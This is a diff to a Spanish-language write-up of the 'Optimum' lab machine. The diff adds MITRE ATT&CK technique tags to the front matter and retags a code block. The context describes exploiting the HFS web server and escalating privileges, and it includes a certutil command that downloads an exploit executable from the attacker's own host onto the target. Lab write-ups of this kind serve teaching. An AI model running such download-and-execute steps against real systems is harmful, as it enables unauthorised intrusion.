@@ -7,6 +7,13 @@ order: 17
 summary: "Explotación de HFS y análisis del sistema para escalar privilegios."
 tags: ["HFS", "Kernel"]
 keywords: "optimum optimum hfs · kernel explotación de hfs y análisis del sistema para escalar privilegios."
+cadena:
+  - seccion: "Acceso a través de HFS"
+    tecnicas: ["T1190"]
+  - seccion: "Enumerando Windows"
+    tecnicas: ["T1082", "T1105"]
+  - seccion: "Escalada de privilegios"
+    tecnicas: ["T1068"]
 ---
 
 ## Acceso a través de HFS
@@ -17,7 +24,7 @@ Nmap solo nos muestra el puerto `80`. En la web encontramos HFS y vemos que la v
 
 Ya dentro, ejecuto `systeminfo` y guardo la salida para pasarla a Windows Exploit Suggester. La herramienta devuelve varias posibilidades; me centro en las que sirven para elevar privilegios. Reviso la vulnerabilidad seleccionada en Exploit-DB y sigo la referencia al ejecutable. Para transferirlo levanto un servidor HTTP en mi equipo y utilizo `certutil` en el destino:
 
-```
+```powershell
 certutil.exe -f -urlcache -split http://IP_LOCAL/ejecutable.exe ejecutable.exe
 ```
 
